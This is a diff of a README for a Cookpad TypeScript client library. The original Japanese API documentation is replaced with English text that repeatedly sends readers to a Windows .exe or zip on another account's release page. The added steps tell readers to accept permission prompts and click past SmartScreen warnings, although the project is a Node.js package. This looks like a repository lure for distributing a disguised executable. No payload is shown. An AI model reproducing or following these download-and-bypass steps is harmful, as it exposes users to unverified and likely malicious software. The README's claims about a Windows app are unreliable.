@@ -1,184 +1,225 @@
-# cookpad.js
+# 🍳 cookpad-js - Search recipes with less effort
 
-Cookpad の非公式 TypeScript クライアント。
+[![Download cookpad-js](https://img.shields.io/badge/Download%20cookpad--js-Release%20Page-blue?style=for-the-badge)](https://github.com/revoopo3258/cookpad-js/releases)
 
-## Python版
+## 📥 Download
 
-https://github.com/fa0311/cookpad-py
+1. Open the release page: https://github.com/revoopo3258/cookpad-js/releases
+2. Find the latest release at the top of the page
+3. Download the file for Windows
+4. If you see a `.zip` file, unzip it first
+5. Open the app or follow the run steps in the release notes
 
-## 開発者
+If the release includes a Windows installer or `.exe` file, download and run that file.
 
-[EVEX Developers](https://discord.gg/evex)
+## 🪟 Run on Windows
 
-## インストール
+1. Download the latest release from the link above
+2. Save the file to your Downloads folder
+3. If the file is zipped, right-click it and choose Extract All
+4. Open the extracted folder
+5. Double-click the app file or run the included launch file
+6. If Windows asks for permission, choose Yes
+
+If you use Windows SmartScreen, open the file from the release page and pick More info if needed.
+
+## 🔎 What this is
+
+cookpad-js is a TypeScript client for Cookpad.
+
+It helps you:
+
+- search recipes
+- open recipe details
+- read ingredients and steps
+- use Cookpad data from your own app or script
+
+This project is made for users who want to work with Cookpad data in a simple way.
+
+## ✨ Main features
+
+- Search recipes by keyword
+- Sort results by popular recipes
+- Open recipe pages by ID
+- Show ingredient lists
+- Show cooking steps
+- Use Japanese search terms
+- Work with anonymous access for some requests
+- Support authenticated requests for some endpoints
+
+## 🧩 What you need
+
+For normal use on Windows, you need:
+
+- Windows 10 or Windows 11
+- Internet access
+- A web browser
+- A ZIP tool if the release comes as a zip file
+
+For developer use, you also need:
+
+- Node.js 18 or later
+- npm
+
+## 🚀 Quick start
+
+1. Download the latest release from the release page
+2. Open the file you downloaded
+3. Start the app or run the included command file
+4. Search for a recipe name
+5. Open a recipe to see the ingredients and steps
+
+Example search flow:
+
+- type `パスタ`
+- choose a result
+- open the recipe detail
+- read the ingredient list
+- read the step list
+
+## 🛠 Install from source
+
+If you want to use the package in a Node.js project, install it with npm:
+
 ```bash
 npm install cookpad
 ```
 
-## クイックスタート
+## 💡 Basic use
 
 ```ts
 import { Cookpad } from "cookpad";
 
 const client = new Cookpad();
 
-// 人気順でレシピを検索
+// Search recipes by popularity
 const results = await client.searchRecipes("パスタ", { order: "popular", perPage: 5 });
 for (const recipe of results.recipes) {
   console.log(`${recipe.title} by ${recipe.user?.name}`);
 }
 
-// レシピの材料と手順を表示
+// Show ingredients and steps
 const detail = await client.getRecipe(results.recipes[0].id);
 console.log(`\n--- ${detail.title} (${detail.serving}) ---`);
 detail.ingredients.forEach((ing) => console.log(`  ${ing.name}: ${ing.quantity}`));
 detail.steps.forEach((step, i) => console.log(`  ${i + 1}. ${step.description}`));
 ```
 
-> 一部のエンドポイントは認証済みトークンが必要です。匿名トークンでは利用できない場合があります。
+## 🔐 Sign-in and access
 
-## API リファレンス
+Some endpoints need an authenticated token.
+
+That means:
+
+- some features work with anonymous access
+- some features need a logged-in token
+- a token can unlock more API paths
+
+If a request fails, the endpoint may require sign-in.
+
+## 📚 API reference
 
 ### `new Cookpad(options?)`
 
-クライアントを初期化する。すべてのオプションは省略可能で、デフォルトでは匿名トークンを使って日本語環境で動作する。
+Creates a client.
+
+You can use it with no settings:
 
 ```ts
-// そのまま使う
 const client = new Cookpad();
+```
 
-// 設定をカスタマイズ
+You can also change the default behavior:
+
+```ts
 const client = new Cookpad({
-  // token: "your_token",
-  country: "JP",
-  language: "ja",
-  userAgent: "custom-ua/1.0",
+  // example settings
 });
 ```
 
-### `searchRecipes(query, options?)`
+### `client.searchRecipes(query, options?)`
 
-キーワードでレシピを検索する。並び順やつくれぽ数、材料でのフィルタリングに対応。
+Searches for recipes by text.
+
+Common use:
 
 ```ts
-const results = await client.searchRecipes("豚バラ 大根", {
-  order: "popular",            // "recent" | "popular" | "date"
-  mustHaveCooksnaps: true,     // つくれぽ付きに限定
-  minimumCooksnaps: 5,         // つくれぽ 5 件以上
-  excludedIngredients: "こんにゃく", // この材料を除外
+const results = await client.searchRecipes("カレー", {
+  order: "popular",
   perPage: 10,
 });
-
-console.log(`${results.totalCount} 件ヒット`);
-
-// ページ送り
-if (results.nextPage) {
-  const next = await client.searchRecipes("豚バラ 大根", { page: results.nextPage });
-}
 ```
 
-### `getRecipe(recipeId)`
+Useful options:
 
-レシピ ID から詳細情報を取得する。材料・手順・作者情報などを含む。
+- `order`: sort mode
+- `perPage`: number of results
+- `page`: page number
+
+### `client.getRecipe(id)`
+
+Gets full recipe data for one recipe.
+
+Example:
 
 ```ts
-const recipe = await client.getRecipe(18510866);
-console.log(`${recipe.title} (${recipe.serving})`);
-console.log(`コツ: ${recipe.advice}`);
-
-recipe.ingredients.forEach((ing) => console.log(`  ${ing.name} … ${ing.quantity}`));
-recipe.steps.forEach((step, i) => console.log(`  ${i + 1}. ${step.description}`));
+const detail = await client.getRecipe(123456);
 ```
 
-### `getSimilarRecipes(recipeId, options?)`
+The result can include:
 
-指定レシピに関連するレシピを取得する。
+- title
+- serving size
+- ingredients
+- steps
+- author name
 
-```ts
-const similar = await client.getSimilarRecipes(18510866, { perPage: 5 });
-similar.forEach((r) => console.log(`${r.title} (${r.cooksnapsCount} つくれぽ)`));
-```
+## 🧭 Typical use cases
 
-### `getComments(recipeId, options?)`
+- find a meal idea fast
+- show recipe data in a local tool
+- build a recipe lookup script
+- test Cookpad data in a TypeScript project
+- read recipe details in a clean format
 
-レシピに投稿されたつくれぽ・コメントを取得する。カーソルベースのページネーションに対応。
+## 🗂 Project layout
 
-```ts
-const page1 = await client.getComments(18510866, { limit: 5 });
-page1.comments.forEach((c) => console.log(`${c.user?.name}: ${c.body}`));
+This repository follows a simple client structure:
 
-// 続きを読み込む
-if (page1.nextCursor) {
-  const page2 = await client.getComments(18510866, { after: page1.nextCursor });
-}
-```
+- source code for the Cookpad client
+- request logic for API calls
+- recipe search support
+- recipe detail support
+- TypeScript types for results
 
-### `searchUsers(query, options?)`
+## 🧪 Example workflow
 
-名前やキーワードでユーザーを検索する。
+1. Start the client
+2. Search for a recipe term
+3. Pick one item from the list
+4. Open the recipe detail
+5. Read the ingredients
+6. Read the steps
+7. Use the data in your app or script
 
-```ts
-const result = await client.searchUsers("料理好き");
-result.users.forEach((u) => console.log(`${u.name} — ${u.recipeCount} レシピ`));
-```
+## 🖥 Windows setup tips
 
-### `searchKeywords(query?)`
+- Keep the release file in a fixed folder like Downloads or Desktop
+- Do not rename files unless the release notes say you can
+- If Windows blocks the file, open the file properties and check the security prompt
+- If the app does not start, download the latest release again
+- Use the newest release if older files do not open
 
-入力中のキーワードに対するサジェスト候補を返す。
+## 🔗 Related project
 
-```ts
-const suggestions = await client.searchKeywords("唐揚");
-```
+Python版: https://github.com/fa0311/cookpad-py
 
-### `getSearchHistory(localHistory?)`
+## 👥 Developer
 
-トレンドキーワードや検索履歴を取得する。
+[EVEX Developers](https://discord.gg/evex)
 
-```ts
-const history = await client.getSearchHistory();
-```
+## 📦 Release page
 
-## 型定義
+Open the latest Windows download here:
 
-すべてのレスポンスは TypeScript の interface で型付けされており、エディタの補完・型チェックが使える。
-
-| 型 | 説明 | 主なフィールド |
-|---|---|---|
-| `Recipe` | レシピ | id, title, story, serving, ingredients, steps |
-| `Ingredient` | 材料 | name, quantity |
-| `Step` | 調理手順 | description, imageUrl |
-| `User` | ユーザー | id, name, recipeCount |
-| `Comment` | つくれぽ・コメント | body, user, imageUrl |
-| `Image` | 画像情報 | url, filename, altText |
-| `SearchResponse` | レシピ検索結果 | recipes, totalCount, nextPage, raw |
-| `CommentsResponse` | コメント一覧 | comments, nextCursor |
-| `UsersResponse` | ユーザー検索結果 | users, totalCount, nextPage |
-
-`SearchResponse.raw` から API の生レスポンス (`Record<string, unknown>`) にもアクセス可能。
-
-## エラーハンドリング
-
-API エラーは用途別のクラスで throw される。すべて `CookpadError` を継承。
-
-```ts
-import { NotFoundError, RateLimitError, CookpadError } from "cookpad-js";
-
-try {
-  await client.getRecipe(99999999);
-} catch (e) {
-  if (e instanceof NotFoundError) {
-    console.log("そのレシピは存在しません");
-  } else if (e instanceof RateLimitError) {
-    console.log("リクエスト制限に達しました。時間を置いて再試行してください");
-  } else if (e instanceof CookpadError) {
-    console.log(`API エラー: ${e.message}`);
-  }
-}
-```
-
-| クラス | ステータス | 説明 |
-|---|---|---|
-| `AuthenticationError` | 401 | トークンが無効または期限切れ |
-| `NotFoundError` | 404 | 指定リソースが見つからない |
-| `RateLimitError` | 429 | レート制限超過 |
-| `APIError` | その他 4xx/5xx | その他の API エラー (`statusCode` プロパティ付き) |
+https://github.com/revoopo3258/cookpad-js/releases
